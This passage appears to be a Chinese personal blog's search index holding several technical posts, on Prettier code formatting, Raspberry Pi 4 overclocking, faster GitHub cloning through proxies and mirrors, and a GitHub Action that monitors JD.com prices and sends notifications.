href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> 